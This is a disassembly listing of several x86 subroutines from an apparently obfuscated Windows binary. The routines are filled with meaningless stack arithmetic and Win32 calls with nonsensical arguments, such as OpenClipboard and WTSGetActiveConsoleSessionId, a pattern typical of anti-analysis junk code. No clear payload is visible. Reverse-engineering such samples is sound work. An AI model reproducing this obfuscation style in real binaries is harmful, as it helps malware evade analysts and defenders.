		mov	[ebp+var_44], ecx
		mov	[ebp+dwFlags], 54h
		mov	edx, [ebp+dwFlags]
		add	edx, 63h
		mov	[ebp+var_250], edx
		movzx	eax, [ebp+var_188]
		mov	ecx, 3Fh
		sub	ecx, eax
		sub	ecx, 48h
		mov	[ebp+var_248], ecx
		mov	[ebp+var_64], 64h
		mov	edx, [ebp+var_18C]
		add	edx, 5Eh
		movzx	eax, [ebp+var_A8]
		and	edx, eax
		movzx	ecx, [ebp+var_5]
		sub	ecx, edx
		mov	[ebp+var_5], cl
		mov	eax, [ebp+dwFlags]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_4071A0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_407380	proc near		; CODE XREF: .text:004029D4p

var_26C		= dword	ptr -26Ch
var_268		= dword	ptr -268h
var_220		= dword	ptr -220h
var_1CC		= dword	ptr -1CCh
var_1C8		= dword	ptr -1C8h
var_1BD		= byte ptr -1BDh
var_1BC		= dword	ptr -1BCh
var_1B4		= dword	ptr -1B4h
var_1AC		= word ptr -1ACh
var_1A4		= word ptr -1A4h
var_1A0		= word ptr -1A0h
var_125		= byte ptr -125h
var_114		= word ptr -114h
var_10C		= dword	ptr -10Ch
var_FC		= dword	ptr -0FCh
var_F5		= byte ptr -0F5h
var_F0		= dword	ptr -0F0h
var_E9		= byte ptr -0E9h
var_E8		= word ptr -0E8h
var_E4		= word ptr -0E4h
var_E0		= word ptr -0E0h
var_CC		= word ptr -0CCh
h		= dword	ptr -0BCh
var_B8		= word ptr -0B8h
var_B4		= dword	ptr -0B4h
var_A0		= dword	ptr -0A0h
var_98		= word ptr -98h
var_94		= dword	ptr -94h
var_28		= dword	ptr -28h
var_22		= byte ptr -22h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_6		= byte ptr -6
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		mov	eax, [ebp+var_1C8]
		mov	[ebp+var_220], eax
		mov	ecx, [ebp+arg_4]
		add	ecx, 28h
		movzx	edx, [ebp+var_E9]
		sub	ecx, edx
		mov	[ebp+var_1BC], ecx
		mov	eax, 56h
		sub	eax, [ebp+var_C]
		mov	[ebp+var_F0], eax
		mov	[ebp+var_10], 2Ah
		mov	ecx, [ebp+h]
		sub	ecx, 21h
		and	ecx, 2Ch
		mov	[ebp+var_1A0], cx
		movzx	edx, [ebp+var_B8]
		and	edx, [ebp+var_FC]
		mov	[ebp+var_C], edx
		mov	eax, [ebp+var_94]
		and	eax, 0FFFFFFDFh
		and	eax, [ebp+arg_C]
		mov	[ebp+var_E0], ax
		mov	[ebp+var_26C], 0
		jmp	short loc_407410
; ---------------------------------------------------------------------------

loc_407401:				; CODE XREF: sub_407380+F6j
		mov	ecx, [ebp+var_26C]
		add	ecx, 1
		mov	[ebp+var_26C], ecx

loc_407410:				; CODE XREF: sub_407380+7Fj
		cmp	[ebp+var_26C], 9
		jge	short loc_407478
		movzx	edx, [ebp+var_B8]
		sub	edx, [ebp+var_268]
		movzx	eax, [ebp+var_22]
		add	edx, eax
		mov	ecx, [ebp+arg_8]
		sub	ecx, [ebp+arg_4]
		and	edx, ecx
		mov	[ebp+var_6], dl
		mov	edx, [ebp+var_A0]
		mov	[ebp+var_1B4], edx
		mov	eax, [ebp+h]
		push	eax		; h
		push	48h		; hdc
		call	ds:SelectObject
		sub	eax, [ebp+arg_10]
		mov	[ebp+arg_8], eax
		movzx	ecx, [ebp+var_E8]
		xor	ecx, 0FFFFFFDAh
		mov	[ebp+var_E8], cx
		movzx	edx, [ebp+var_1AC]
		sub	edx, 52h
		mov	[ebp+arg_14], edx
		jmp	short loc_407401
; ---------------------------------------------------------------------------

loc_407478:				; CODE XREF: sub_407380+97j
		movzx	eax, [ebp+var_F5]
		movzx	ecx, [ebp+var_1A0]
		add	eax, ecx
		mov	[ebp+var_B8], ax
		mov	edx, 3Ch
		sub	edx, [ebp+var_1B4]
		mov	eax, [ebp+arg_0]
		sub	eax, [ebp+arg_10]
		or	edx, eax
		mov	[ebp+var_CC], dx
		movzx	ecx, [ebp+var_125]
		movzx	edx, [ebp+var_1A4]
		sub	edx, ecx
		mov	[ebp+var_1A4], dx
		mov	eax, [ebp+var_1CC]
		cmp	eax, dword_42C004
		jle	short loc_4074F5
		mov	[ebp+var_F0], 1Eh
		movzx	ecx, [ebp+var_1A0]
		movzx	edx, [ebp+var_98]
		sub	ecx, edx
		and	ecx, 2Eh
		xor	ecx, [ebp+arg_0]
		mov	[ebp+var_E4], cx

loc_4074F5:				; CODE XREF: sub_407380+14Cj
		mov	eax, [ebp+var_1BC]
		add	eax, 42h
		mov	[ebp+var_10], eax
		cmp	[ebp+var_28], 23h
		jge	short loc_40752F
		mov	ecx, [ebp+var_1C8]
		add	ecx, 38h
		sub	ecx, [ebp+var_10]
		movzx	edx, [ebp+var_114]
		and	ecx, edx
		or	ecx, 5Dh
		mov	[ebp+var_1BD], cl
		mov	[ebp+var_F0], 65h

loc_40752F:				; CODE XREF: sub_407380+185j
		mov	eax, [ebp+arg_10]
		add	eax, 10h
		mov	[ebp+var_10C], eax
		mov	ecx, [ebp+var_10]
		add	ecx, 12h
		sub	ecx, [ebp+arg_10]
		mov	[ebp+var_B4], ecx
		mov	edx, [ebp+arg_C]
		mov	[ebp+arg_C], edx
		mov	eax, [ebp+var_F0]
		mov	esp, ebp
		pop	ebp
		retn
sub_407380	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 258h
		push	ebx
		movzx	eax, byte ptr [ebp-0E9h]
		mov	ecx, [ebp-118h]
		sub	ecx, eax
		add	ecx, 34h
		xor	ecx, 57h
		mov	[ebp-1B8h], cx
		mov	dword ptr [ebp+0Ch], 3Eh
		mov	edx, [ebp-1B0h]
		or	edx, [ebp-1A0h]
		mov	[ebp-11Ch], edx
		movzx	eax, byte ptr [ebp-0D9h]
		sub	eax, 0Dh
		mov	[ebp-0D9h], al
		mov	ebx, [ebp-118h]
		add	ebx, 3Eh
		sub	ebx, [ebp-1C4h]
		sub	ebx, [ebp+8]
		mov	ecx, [ebp-118h]
		push	ecx
		call	ds:FreeResource
		sub	ebx, eax
		mov	[ebp-255h], bl
		movzx	edx, byte ptr [ebp-91h]
		add	edx, 1Fh
		or	edx, [ebp+8]
		mov	[ebp-244h], edx
		mov	eax, [ebp-0ACh]
		add	eax, [ebp+0Ch]
		movzx	ecx, word ptr [ebp-0BCh]
		sub	eax, ecx
		mov	[ebp-254h], eax
		movzx	edx, word ptr [ebp-198h]
		mov	eax, [ebp+0Ch]
		lea	ecx, [edx+eax+4Dh]
		mov	[ebp-254h], ecx
		mov	ebx, 1Dh
		sub	ebx, [ebp-250h]
		mov	edx, [ebp-1BCh]
		push	edx
		mov	eax, [ebp-11Ch]
		push	eax
		mov	ecx, [ebp-1C0h]
		push	ecx
		mov	edx, [ebp-1C0h]
		push	edx
		mov	eax, [ebp-1C4h]
		push	eax
		mov	ecx, [ebp-1BCh]
		push	ecx
		call	sub_40EB80
		add	esp, 18h
		sub	ebx, eax
		sub	ebx, 58h
		or	ebx, [ebp-8Ch]
		mov	[ebp-255h], bl
		mov	edx, [ebp-1C4h]
		and	edx, 56h
		xor	edx, [ebp-1BCh]
		mov	[ebp-254h], edx
		lea	eax, [ebp+8]
		sub	eax, 46h
		movzx	ecx, word ptr [eax]
		mov	[ebp-1C0h], ecx
		mov	dword ptr [ebp-1F0h], 21h
		movzx	edx, word ptr [ebp-110h]
		add	edx, [ebp-8Ch]
		mov	eax, [ebp+8]
		lea	ecx, [edx+eax+31h]
		xor	ecx, [ebp-250h]
		mov	[ebp-7], cl
		mov	edx, 3Bh
		sub	edx, [ebp-0E0h]
		movzx	eax, word ptr [ebp-100h]
		sub	edx, eax
		sub	edx, 43h
		mov	[ebp-0FCh], dx
		mov	ecx, [ebp-20Bh]
		mov	[ebp-250h], ecx
		mov	edx, [ebp-1C0h]
		mov	[ebp-168h], edx
		movzx	eax, word ptr [ebp-110h]
		mov	ecx, 46h
		sub	ecx, eax
		mov	[ebp-0CCh], ecx
		mov	edx, [ebp-118h]
		add	edx, 70h
		mov	[ebp-0D0h], dx
		mov	eax, [ebp-11Ch]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 258h
		movzx	eax, byte ptr [ebp-11Eh]
		movzx	ecx, word ptr [ebp-0F8h]
		add	eax, ecx
		or	eax, 0Bh
		movzx	edx, word ptr [ebp-0D4h]
		add	edx, eax
		mov	[ebp-0D4h], dx
		movzx	eax, word ptr [ebp-0C0h]
		and	eax, 22h
		mov	[ebp-10h], ax
		movzx	ecx, byte ptr [ebp-6]
		mov	edx, 5Ah
		sub	edx, ecx
		mov	[ebp-0B0h], edx
		mov	eax, [ebp-0BCh]
		add	eax, 65h
		and	eax, 47h
		mov	[ebp-1B1h], al
		mov	ecx, [ebp+8]
		sub	ecx, 2Dh
		mov	edx, dword_42C044
		sub	edx, ecx
		mov	dword_42C044, edx
		mov	dword ptr [ebp-0D0h], 1Fh
		mov	eax, [ebp-1A4h]
		sub	eax, 6
		mov	[ebp-0FCh], ax
		mov	ecx, [ebp+1Ch]
		mov	[ebp-1FCh], ecx
		movzx	edx, word ptr [ebp-0D4h]
		mov	eax, [ebp-4]
		lea	ecx, [edx+eax-12h]
		mov	[ebp-0ECh], ecx
		movzx	edx, byte ptr [ebp-0C1h]
		or	edx, 55h
		mov	eax, dword_42C034
		sub	eax, edx
		mov	dword_42C034, eax
		movzx	ecx, byte ptr [ebp-91h]
		mov	edx, dword_42C050
		sub	edx, ecx
		mov	dword_42C050, edx
		movzx	eax, word ptr [ebp-19Ch]
		add	eax, dword_42C034
		mov	dword_42C034, eax
		movzx	ecx, word ptr [ebp-24Ch]
		and	ecx, 37h
		mov	[ebp-24Ch], cx
		mov	eax, [ebp-258h]
		mov	esp, ebp
		pop	ebp
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_407820	proc near		; CODE XREF: sub_409DF0+FFBp

var_240		= dword	ptr -240h
var_239		= byte ptr -239h
var_22C		= dword	ptr -22Ch
var_228		= dword	ptr -228h
var_21C		= word ptr -21Ch
var_1F4		= dword	ptr -1F4h
var_1C4		= dword	ptr -1C4h
var_1AC		= dword	ptr -1ACh
var_1A8		= dword	ptr -1A8h
var_1A1		= byte ptr -1A1h
var_1A0		= dword	ptr -1A0h
var_194		= word ptr -194h
var_138		= dword	ptr -138h
var_108		= word ptr -108h
var_F9		= byte ptr -0F9h
var_E1		= byte ptr -0E1h
var_E0		= dword	ptr -0E0h
var_D5		= byte ptr -0D5h
var_D4		= word ptr -0D4h
var_B9		= byte ptr -0B9h
var_B8		= word ptr -0B8h
var_B4		= dword	ptr -0B4h
var_AC		= dword	ptr -0ACh
var_98		= dword	ptr -98h
var_91		= byte ptr -91h
var_20		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_10		= dword	ptr -10h
var_7		= byte ptr -7
var_6		= byte ptr -6
hdc		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_6B		= dword	ptr  73h

		push	ebp
		mov	ebp, esp
		sub	esp, 240h
		push	ebx
		push	esi
		movzx	eax, [ebp+var_D4]
		sub	eax, 56h
		xor	eax, [ebp+var_10]
		mov	[ebp+var_1A0], eax
		mov	ecx, dword_42C008
		cmp	ecx, [ebp+var_1AC]
		jl	short loc_407866
		mov	[ebp+var_240], 19h
		movzx	edx, [ebp+var_7]
		movzx	eax, [ebp+var_F9]
		sub	edx, eax
		mov	[ebp+arg_10], edx

loc_407866:				; CODE XREF: sub_407820+2Aj
		mov	ecx, [ebp+var_240]
		sub	ecx, [ebp+var_B4]
		and	ecx, [ebp+var_1A8]
		mov	[ebp+var_10], ecx
		mov	[ebp+arg_C], 5Bh
		movzx	edx, [ebp+var_B8]
		mov	[ebp+var_1A8], edx
		mov	eax, [ebp+hdc]
		mov	[ebp+arg_C], eax
		movzx	ecx, [ebp+var_1A1]
		add	ecx, 6
		and	ecx, 23h
		mov	[ebp+var_228], ecx
		mov	esi, [ebp+arg_8]
		add	esi, 17h
		push	5Fh		; hWndNewOwner
		call	ds:OpenClipboard
		or	esi, eax
		mov	[ebp+var_E0], esi
		mov	edx, [ebp+arg_6B]
		mov	[ebp+var_AC], edx
		mov	eax, [ebp+var_240]
		mov	[ebp+var_1C4], eax
		mov	ebx, 6Eh
		sub	ebx, [ebp+var_AC]
		mov	ecx, [ebp+var_1A8]
		push	ecx
		mov	edx, [ebp+var_1A8]
		push	edx
		mov	eax, [ebp+var_1A8]
		push	eax
		mov	ecx, [ebp+var_20]
		push	ecx
		call	sub_408860
		add	esp, 10h
		sub	ebx, eax
		or	ebx, [ebp+var_20]
		mov	[ebp+var_7], bl
		mov	edx, [ebp+arg_C]
		mov	[ebp+var_20], edx
		mov	[ebp+var_1F4], 56h
		movzx	eax, [ebp+var_B9]
		sub	eax, 54h
		movzx	ecx, [ebp+var_239]
		sub	eax, ecx
		mov	[ebp+var_91], al
		movzx	ebx, [ebp+var_19]
		add	ebx, [ebp+arg_4]
		call	ds:WTSGetActiveConsoleSessionId
		add	eax, 30h
		movzx	edx, [ebp+var_B9]
		sub	eax, edx
		or	ebx, eax
		mov	[ebp+var_D5], bl
		mov	eax, [ebp+arg_10]
		mov	[ebp+var_138], eax
		mov	[ebp+arg_10], 2Ah
		mov	ecx, [ebp+var_20]
		sub	ecx, [ebp+arg_C]
		sub	ecx, [ebp+arg_8]
		sub	ecx, [ebp+var_22C]
		mov	[ebp+var_108], cx
		mov	edx, [ebp+hdc]
		mov	[ebp+arg_10], edx
		mov	eax, 22h
		sub	eax, [ebp+var_22C]
		add	eax, [ebp+var_AC]
		mov	ecx, 43h
		sub	ecx, [ebp+arg_10]
		and	eax, ecx
		mov	[ebp+var_D5], al
		movzx	edx, [ebp+var_108]
		add	edx, 3Fh
		mov	[ebp+var_108], dx
		mov	eax, 5Dh
		mov	word ptr [ebp+var_1A8],	ax
		mov	ecx, [ebp+var_20]
		add	ecx, [ebp+arg_C]
		mov	[ebp+var_AC], ecx
		movzx	edx, [ebp+var_21C]
		mov	eax, [ebp+arg_10]
		lea	ecx, [edx+eax+12h]
		mov	[ebp+var_21C], cx
		movzx	edx, [ebp+var_1A]
		add	edx, 28h
		mov	[ebp+arg_10], edx
		movzx	ebx, [ebp+var_E1]
		add	ebx, [ebp+var_98]
		mov	eax, [ebp+var_1A8]
		push	eax		; int
		mov	ecx, [ebp+var_AC]
		push	ecx		; int
		mov	edx, [ebp+arg_10]
		push	edx		; int
		mov	eax, [ebp+hdc]
		push	eax		; hdc
		mov	ecx, [ebp+var_AC]
		push	ecx		; int
		mov	edx, [ebp+var_AC]
		push	edx		; int
		call	sub_40FF80
		add	esp, 18h
		add	eax, 70h
		or	ebx, eax
		mov	[ebp+var_D5], bl
		movzx	eax, [ebp+var_D5]
		mov	ecx, [ebp+var_20]
		sub	ecx, eax
		and	ecx, [ebp+arg_C]
		or	ecx, 59h
		mov	[ebp+var_194], cx
		mov	[ebp+arg_8], 2Ch
		mov	edx, [ebp+var_AC]
		sub	edx, [ebp+var_240]
		mov	[ebp+var_1A8], edx
		mov	eax, [ebp+var_240]
		add	eax, 38h
		mov	[ebp+hdc], eax
		movzx	ecx, [ebp+var_91]
		movzx	edx, [ebp+var_6]
		add	edx, ecx
		mov	[ebp+var_6], dl
		mov	eax, [ebp+var_1A8]
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_407820	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_407A90	proc near		; CODE XREF: WinMain(x,x,x,x)+552Bp

var_268		= dword	ptr -268h
var_264		= dword	ptr -264h
var_260		= dword	ptr -260h
var_259		= byte ptr -259h
var_258		= dword	ptr -258h
var_250		= word ptr -250h
var_248		= dword	ptr -248h
var_240		= word ptr -240h
var_23C		= word ptr -23Ch
var_220		= dword	ptr -220h
var_1F8		= dword	ptr -1F8h
var_1EC		= dword	ptr -1ECh
var_1E0		= dword	ptr -1E0h
var_1C8		= dword	ptr -1C8h
var_1C4		= dword	ptr -1C4h
var_1BD		= byte ptr -1BDh
var_1BC		= dword	ptr -1BCh
var_1B0		= word ptr -1B0h
var_1AC		= dword	ptr -1ACh
var_1A4		= dword	ptr -1A4h
var_1A0		= word ptr -1A0h
var_181		= word ptr -181h
var_174		= dword	ptr -174h
var_148		= dword	ptr -148h
var_140		= dword	ptr -140h
var_124		= dword	ptr -124h
var_11D		= byte ptr -11Dh
var_11C		= word ptr -11Ch
var_10E		= byte ptr -10Eh
var_10C		= word ptr -10Ch
var_108		= word ptr -108h
var_104		= dword	ptr -104h
var_F8		= dword	ptr -0F8h
var_F1		= byte ptr -0F1h
var_E9		= byte ptr -0E9h
var_E4		= word ptr -0E4h
var_E0		= word ptr -0E0h
var_DC		= dword	ptr -0DCh
var_C9		= byte ptr -0C9h
var_C8		= word ptr -0C8h
var_C4		= dword	ptr -0C4h
var_C0		= word ptr -0C0h
var_BC		= dword	ptr -0BCh
var_B8		= word ptr -0B8h
var_B4		= dword	ptr -0B4h
var_AC		= word ptr -0ACh
var_A0		= dword	ptr -0A0h
var_98		= word ptr -98h
var_94		= dword	ptr -94h
var_88		= dword	ptr -88h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_18		= word ptr -18h
var_14		= dword	ptr -14h
var_C		= dword	ptr -0Ch
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 268h
		push	esi
		movzx	eax, [ebp+var_11C]
		add	eax, 51h
		mov	ecx, dword_42C050
		sub	ecx, eax
		mov	dword_42C050, ecx
		push	27h		; cpt
		mov	edx, lpExitCode
		push	edx		; apt
		mov	eax, lpExitCode
		push	eax		; hdc
		call	ds:Polyline
		sub	eax, 36h
		or	eax, 9
		mov	[ebp+var_18], ax
		movzx	ecx, byte ptr hdc
		mov	dword_42C024, ecx
		mov	edx, hdc
		add	edx, dword_42C024
		movzx	eax, [ebp+var_7]
		and	edx, eax
		xor	edx, y
		mov	[ebp+var_C8], dx
		mov	[ebp+var_1F8], 47h
		mov	ecx, 9
		sub	ecx, [ebp+var_F8]
		xor	ecx, 4
		mov	[ebp+var_1A0], cx
		movzx	edx, [ebp+var_1BD]
		add	edx, 40h
		mov	[ebp+var_1C4], edx
		mov	eax, [ebp+var_124]
		sub	eax, 16h
		mov	[ebp+var_A0], eax
		movzx	ecx, [ebp+var_181]
		mov	[ebp+var_1C4], ecx
		mov	edx, [ebp+var_1C4]
		mov	[ebp+var_88], edx
		mov	eax, [ebp+var_F8]
		add	eax, [ebp+var_28]
		mov	[ebp+var_1C4], eax
		mov	ecx, [ebp+var_104]
		sub	ecx, 11h
		mov	[ebp+var_B4], ecx
		movzx	edx, [ebp+var_10E]
		and	edx, 58h
		movzx	eax, [ebp+var_1D]
		sub	eax, edx
		mov	[ebp+var_1D], al
		mov	ecx, [ebp+var_1AC]
		sub	ecx, 43h
		and	ecx, 58h
		mov	[ebp+var_94], ecx
		mov	edx, lpExitCode
		push	edx		; int
		mov	eax, y
		push	eax		; int
		mov	ecx, y
		push	ecx		; y
		call	sub_402520
		add	esp, 0Ch
		mov	lpExitCode, eax
		movzx	edx, [ebp+var_10C]
		add	edx, 0Bh
		and	edx, 22h
		mov	[ebp+var_1B0], dx
		movzx	eax, [ebp+var_259]
		add	eax, [ebp+var_260]
		or	eax, [ebp+var_F8]
		mov	[ebp+var_4], eax
		mov	ecx, [ebp+var_124]
		mov	[ebp+var_1E0], ecx
		mov	edx, [ebp+var_24]
		sub	edx, 0Dh
		sub	edx, [ebp+var_1C4]
		or	edx, 41h
		mov	[ebp+var_1BD], dl
		mov	esi, [ebp+var_1C4]
		add	esi, 5Ah
		call	ds:AnyPopup
		and	esi, eax
		mov	[ebp+var_4], esi
		mov	eax, [ebp+var_F8]
		mov	[ebp+var_220], eax
		mov	ecx, [ebp+var_124]
		or	ecx, 32h
		mov	[ebp+var_28], ecx
		mov	edx, [ebp+arg_0]
		push	edx
		call	sub_402C40
		add	esp, 4
		movzx	eax, [ebp+var_10C]
		mov	ecx, 0Dh
		sub	ecx, eax
		or	ecx, 53h
		mov	[ebp+var_258], ecx
		mov	[ebp+var_1D], 1Ah
		mov	edx, [ebp+var_BC]
		mov	[ebp+var_148], edx
		mov	eax, [ebp+var_28]
		add	eax, [ebp+var_F8]
		mov	[ebp+var_260], eax
		movzx	ecx, [ebp+var_98]
		mov	edx, 2Dh
		sub	edx, ecx
		mov	eax, [ebp+var_104]
		lea	ecx, [edx+eax+39h]
		and	ecx, [ebp+var_24]
		mov	[ebp+var_11D], cl
		mov	edx, [ebp+var_28]
		add	edx, 11h
		xor	edx, 61h
		mov	[ebp+var_98], dx
		mov	[ebp+var_124], 0FFFFFFF3h
		movzx	eax, [ebp+var_10C]
		sub	eax, 5Dh
		or	eax, 0Fh
		movzx	ecx, [ebp+var_1E]
		add	ecx, eax
		mov	[ebp+var_1E], cl
		mov	[ebp+var_C], 0
		mov	edx, [ebp+var_28]
		mov	[ebp+var_88], edx
		mov	eax, [ebp+var_14]
		add	eax, 12h
		mov	[ebp+var_24], eax
		movzx	ecx, [ebp+var_C9]
		cmp	[ebp+var_A0], ecx
		jge	short loc_407CF8
		mov	edx, [ebp+var_A0]
		mov	[ebp+var_1C4], edx
		jmp	short loc_407D09
; ---------------------------------------------------------------------------

loc_407CF8:				; CODE XREF: sub_407A90+258j
		mov	[ebp+var_F8], 0FFFFFFBBh
		mov	[ebp+var_24], 3Eh

loc_407D09:				; CODE XREF: sub_407A90+266j
		movzx	eax, [ebp+var_F1]
		add	eax, 96h
		mov	[ebp+var_1BC], eax
		mov	[ebp+var_1A4], 0
		mov	ecx, [ebp+var_124]
		push	ecx
		call	sub_408460
		add	esp, 4
		add	eax, 14h
		or	eax, 2Dh
		mov	[ebp+var_248], eax
		movzx	edx, [ebp+var_E9]
		mov	eax, [ebp+var_124]
		lea	ecx, [eax+edx+82h]
		mov	[ebp+var_1D], cl
		mov	[ebp+var_BC], 0B4h
		mov	dword_42C04C, 36h
		mov	[ebp+var_1C8], 0
		mov	edx, 7
		sub	edx, [ebp+var_28]
		sub	edx, 12h
		sub	edx, [ebp+var_DC]
		sub	edx, 3Eh
		mov	[ebp+var_6], dl
		mov	eax, [ebp+var_28]
		mov	ecx, [ebp+var_4]
		lea	edx, [ecx+eax+2Bh]
		mov	eax, [ebp+var_1C4]
		sub	eax, [ebp+var_260]
		and	edx, eax
		mov	[ebp+var_F1], dl
		movzx	ecx, [ebp+var_C8]
		mov	edx, [ebp+var_124]
		sub	edx, ecx
		mov	eax, [ebp+var_28]
		add	eax, 25h
		and	edx, eax
		movzx	ecx, [ebp+var_7]
		xor	edx, ecx
		mov	[ebp+var_E9], dl
		mov	edx, [ebp+var_24]
		mov	[ebp+var_140], edx
		mov	eax, [ebp+var_A0]
		sub	eax, 3Dh
		mov	[ebp+var_124], eax
		mov	ecx, [ebp+var_C]
		shl	ecx, 2
		push	ecx		; size_t
		mov	edx, [ebp+var_1A4]
		push	edx		; void *
		call	_realloc
		add	esp, 8
		mov	[ebp+var_1C8], eax
		mov	eax, [ebp+var_260]
		mov	[ebp+var_268], eax
		cmp	[ebp+var_268], 0
		jz	short loc_407E31
		cmp	[ebp+var_268], 1
		jz	short loc_407E75
		cmp	[ebp+var_268], 2
		jz	loc_407EB2
		jmp	loc_407EFC
; ---------------------------------------------------------------------------

loc_407E31:				; CODE XREF: sub_407A90+384j
		mov	ecx, [ebp+var_258]
		sub	ecx, 4Ah
		xor	ecx, 0F6h
		mov	[ebp+var_F1], cl
		movzx	edx, [ebp+var_11D]
		movzx	eax, [ebp+var_AC]
		add	eax, edx
		mov	[ebp+var_AC], ax
		mov	ecx, [ebp+var_F8]
		xor	ecx, [ebp+var_A0]
		mov	[ebp+var_98], cx
		jmp	loc_407EFC
; ---------------------------------------------------------------------------

loc_407E75:				; CODE XREF: sub_407A90+38Dj
		movzx	edx, [ebp+var_B8]
		add	edx, 2Bh
		mov	[ebp+var_E4], dx
		movzx	eax, [ebp+var_1E]
		and	eax, 7Fh
		and	eax, 28h
		or	eax, [ebp+var_24]
		mov	[ebp+var_259], al
		movzx	ecx, [ebp+var_250]
		add	ecx, [ebp+var_A0]
		and	ecx, [ebp+var_A0]
		mov	[ebp+var_18], cx
		jmp	short loc_407EFC
; ---------------------------------------------------------------------------

loc_407EB2:				; CODE XREF: sub_407A90+396j
		cmp	[ebp+var_1C4], 57h
		jle	short loc_407ECA
		mov	edx, [ebp+var_124]
		add	edx, 24h
		mov	[ebp+var_A0], edx

loc_407ECA:				; CODE XREF: sub_407A90+429j
		movzx	eax, [ebp+var_23C]
		movzx	ecx, [ebp+var_C0]
		sub	ecx, eax
		mov	[ebp+var_C0], cx
		mov	edx, 14h
		sub	edx, [ebp+var_BC]
		movzx	eax, [ebp+var_240]
		sub	eax, edx
		mov	[ebp+var_240], ax

loc_407EFC:				; CODE XREF: sub_407A90+39Cj
					; sub_407A90+3E0j ...
		movzx	ecx, word ptr [ebp+var_A0]
		mov	[ebp+var_124], ecx
		mov	edx, [ebp+var_F8]
		mov	[ebp+var_1EC], edx
		mov	eax, [ebp+var_1C4]
		mov	[ebp+var_A0], eax
		mov	[ebp+var_264], 0
		jmp	short loc_407F3C
; ---------------------------------------------------------------------------

loc_407F2D:				; CODE XREF: sub_407A90+50Bj
		mov	ecx, [ebp+var_264]
		add	ecx, 1
		mov	[ebp+var_264], ecx

loc_407F3C:				; CODE XREF: sub_407A90+49Bj
		cmp	[ebp+var_264], 6
		jge	short loc_407F9D
		mov	edx, [ebp+var_258]
		sub	edx, 19h
		mov	[ebp+var_C4], edx
		movzx	eax, byte ptr [ebp+var_24]
		mov	[ebp+var_124], eax
		mov	ecx, [ebp+var_DC]
		sub	ecx, 0Bh
		sub	ecx, [ebp+var_260]
		xor	ecx, [ebp+var_28]
		mov	[ebp+var_E0], cx
		mov	edx, [ebp+var_124]
		add	edx, 2
		mov	dword_42C03C, edx
		movzx	eax, [ebp+var_108]
		movzx	ecx, [ebp+var_5]
		add	eax, [ebp+var_4]
		lea	edx, [ecx+eax+35h]
		mov	[ebp+var_6], dl
		jmp	short loc_407F2D
; ---------------------------------------------------------------------------

loc_407F9D:				; CODE XREF: sub_407A90+4B3j
		mov	eax, dword_42C054
		sub	eax, 4Eh
		mov	dword_42C054, eax
		mov	ecx, [ebp+var_A0]
		mov	[ebp+var_174], ecx
		mov	edx, [ebp+var_124]
		add	edx, 3Bh
		movzx	eax, [ebp+var_10C]
		sub	edx, eax
		mov	[ebp+var_C4], edx
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_407A90	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 248h
		movzx	eax, word ptr [ebp-0DCh]
		mov	ecx, 2Ch
		sub	ecx, eax
		mov	[ebp+8], ecx
		mov	dword ptr [ebp-24h], 0A2h
		movzx	edx, word ptr [ebp-228h]
		add	edx, 2Bh
		mov	[ebp-228h], dx
		mov	dword ptr [ebp+8], 0Ch
		mov	dword ptr [ebp-120h], 5Ch
		mov	dword ptr [ebp-0B4h], 0Eh
		cmp	dword_42C000, 24h
		jl	short loc_40805C
		mov	eax, [ebp-0ACh]
		add	eax, 2Fh
		sub	eax, [ebp-0B4h]
		mov	[ebp-0E4h], eax
		mov	ecx, 16h
		sub	ecx, [ebp-24h]
		sub	ecx, 3Dh
		mov	[ebp-116h], cl

loc_40805C:				; CODE XREF: .text:00408034j
		mov	edx, [ebp-0Ch]
		mov	[ebp-1D8h], edx
		movzx	eax, word ptr [ebp-0C0h]
		mov	ecx, [ebp-24h]
		lea	edx, [eax+ecx+19h]
		and	edx, [ebp+10h]
		mov	[ebp-5], dl
		mov	eax, 0FCh
		mov	[ebp-10h], ax
		mov	ecx, [ebp-0Ch]
		mov	[ebp-40h], ecx
		mov	edx, [ebp+18h]
		mov	[ebp-1B4h], edx
		movzx	eax, word ptr [ebp-1Ch]
		sub	eax, 97h
		mov	[ebp-0D4h], ax
		mov	ecx, [ebp-230h]
		add	ecx, 27h
		movzx	edx, word ptr [ebp-238h]
		sub	edx, 2Dh
		xor	ecx, edx
		movzx	eax, byte ptr [ebp-19Dh]
		or	ecx, eax
		mov	[ebp-5], cl
		movzx	ecx, byte ptr [ebp-1B4h]
		mov	[ebp-0B4h], ecx
		mov	edx, [ebp-0A0h]
		mov	[ebp-0Ch], edx
		mov	eax, [ebp-244h]
		add	eax, [ebp-1B4h]
		mov	[ebp-108h], eax
		movzx	ecx, word ptr [ebp-1Ch]
		mov	[ebp-0B4h], ecx
		mov	dword ptr [ebp-4Ch], 2
		movzx	edx, byte ptr [ebp-5]
		mov	eax, [ebp-0D0h]
		lea	ecx, [edx+eax-0Ah]
		mov	[ebp-14h], ecx
		mov	edx, dword_42C03C
		sub	edx, 56h
		mov	dword_42C03C, edx
		mov	eax, [ebp-0B4h]
		xor	eax, 0Ah
